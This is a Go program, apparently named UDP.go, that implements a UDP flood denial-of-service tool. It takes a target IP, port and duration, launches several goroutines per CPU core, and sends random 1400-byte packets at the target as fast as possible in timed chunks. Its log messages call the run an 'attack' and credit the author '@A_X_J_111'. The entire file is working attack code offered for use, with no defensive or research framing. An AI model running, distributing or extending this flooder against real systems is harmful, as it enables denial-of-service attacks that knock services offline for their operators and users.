package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	packetSize    = 1400
	chunkDuration = 100
)

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("Invalid attack duration:", err)
		return
	}

	numThreads := int(float64(runtime.NumCPU()) * 2.5)

	var wg sync.WaitGroup
	numChunks := (duration + chunkDuration - 1) / chunkDuration

	// Channel to signal cancellation or termination
	done := make(chan struct{})
	// Graceful shutdown handler
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		close(done)
	}()

	rand.Seed(time.Now().UnixNano())

	// Process each chunk sequentially
	for chunk := 0; chunk < numChunks; chunk++ {
		log.Printf("Starting chunk %d/%d\n", chunk+1, numChunks)

		chunkTime := chunkDuration
		if (chunk+1)*chunkDuration > duration {
			chunkTime = duration - chunk*chunkDuration
		}

		// Define the attack deadline
		deadline := time.Now().Add(time.Duration(chunkTime) * time.Second)

		go countdown(chunkTime, done)

		for i := 0; i < numThreads; i++ {
			wg.Add(1)
			go func(threadID int) {
				defer wg.Done()
				log.Printf("Thread %d starting, deadline: %v\n", threadID, deadline)
				sendUDPPackets(targetIP, targetPort, deadline, done)
			}(i)
		}

		wg.Wait()

		// Check if the operation is done
		if isDone(done) {
			log.Println("Operation interrupted by termination signal.")
			break
		}

		log.Printf("Chunk %d finished\n", chunk+1)
	}

	log.Println("Attack operation finished.")
	log.Println("SCRIPT MADE AND OWNED BY @A_X_J_111")
	cleanup()
}

func sendUDPPackets(ip, port string, deadline time.Time, done chan struct{}) {
	// Use net.ResolveUDPAddr to resolve the target address and reuse the connection if needed
	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		log.Printf("Error resolving target address: %v\n", err)
		return
	}

	// Dial the UDP connection and ensure proper cleanup
	conn, err := net.DialUDP("udp", nil, targetAddr)
	if err != nil {
		log.Printf("Error creating UDP connection: %v\n", err)
		return
	}
	defer func() {
		conn.Close()
		log.Println("UDP connection closed")
	}()

	// Increase socket write buffer size
	err = conn.SetWriteBuffer(65536)
	if err != nil {
		log.Printf("Error setting write buffer: %v\n", err)
		return
	}

	packet := generatePacket(packetSize)
	var packetsSent uint64

	for {
		// Exit if the deadline is reached
		if time.Now().After(deadline) {
			break
		}
		// Exit if the operation is cancelled
		if isDone(done) {
			break
		}

		_, err := conn.Write(packet)
		if err != nil {
			log.Printf("Error sending UDP packet: %v\n", err)
			continue
		}

		atomic.AddUint64(&packetsSent, 1)
	}

	log.Printf("Sent %d packets\n", packetsSent)
}

func countdown(remainingTime int, done chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for i := remainingTime; i > 0; i-- {
		fmt.Printf("\rTime remaining: %d seconds", i)
		select {
		case <-ticker.C:
		case <-done:
			fmt.Println("\rOperation interrupted.")
			return
		}
	}
	fmt.Println("\rTime remaining: 0 seconds")
}

func isDone(done chan struct{}) bool {
	select {
	case <-done:
		return true
	default:
		return false
	}
}

func generatePacket(size int) []byte {
	packet := make([]byte, size)
	for i := 0; i < size; i++ {
		packet[i] = byte(rand.Intn(256))
	}
	return packet
}

func cleanup() {
	log.Println("Performing cleanup tasks...")
	// Add any cleanup tasks here, if needed
	log.Println("SCRIPT MADE AND OWNED BY @A_X_J_111")
}
